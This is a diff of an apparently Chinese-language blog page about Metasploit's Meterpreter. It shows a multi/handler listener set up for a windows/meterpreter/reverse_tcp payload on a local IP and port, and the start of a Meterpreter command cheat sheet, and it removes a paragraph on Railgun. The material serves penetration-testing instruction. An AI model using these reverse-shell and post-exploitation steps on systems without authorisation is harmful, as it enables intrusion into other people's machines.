@@ -59,8 +59,7 @@ Screenshot saved to: /root/tjteQinp.jpeg</code></pre><p>在根目录下看到<co
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.196.193</span><br><span class="line">msf &gt; set LPORT 4444</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/02/18/metasploit之meterpreter/7.png" alt></p>
-<h3 id="将命令行shell升级为meterpreterses"><a href="#将命令行shell升级为meterpreterses" class="headerlink" title="将命令行shell升级为meterpreterses"></a>将命令行shell升级为meterpreterses</h3><h3 id="通过Railgun组建操作Windows-API"><a href="#通过Railgun组建操作Windows-API" class="headerlink" title="通过Railgun组建操作Windows API"></a>通过Railgun组建操作Windows API</h3><p>通过metasploit附加组件Railgun可以直接与windows本地API进行交互，可以直接通过Meterpreter进入到一个交互式的Ruby shell(irb)<br><code>irb shell</code>允许使用Ruby的愈发与meterpreter直接交互</p>
-<h3 id="0x07-Meterpreter速查命令"><a href="#0x07-Meterpreter速查命令" class="headerlink" title="0x07 Meterpreter速查命令"></a>0x07 Meterpreter速查命令</h3><p><code>help</code>: 打开Meterpreter使用帮助</p>
+<h3 id="将命令行shell升级为meterpreterses"><a href="#将命令行shell升级为meterpreterses" class="headerlink" title="将命令行shell升级为meterpreterses"></a>将命令行shell升级为meterpreterses</h3><h3 id="0x07-Meterpreter速查命令"><a href="#0x07-Meterpreter速查命令" class="headerlink" title="0x07 Meterpreter速查命令"></a>0x07 Meterpreter速查命令</h3><p><code>help</code>: 打开Meterpreter使用帮助</p>
 <p><code>run scriptname</code>: 运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名</p>
 <p><code>sysinfo</code>: 列出受控主机的系统信息</p>
 <p><code>ls</code>: 列出目标主机的文件和文件夹信息</p>
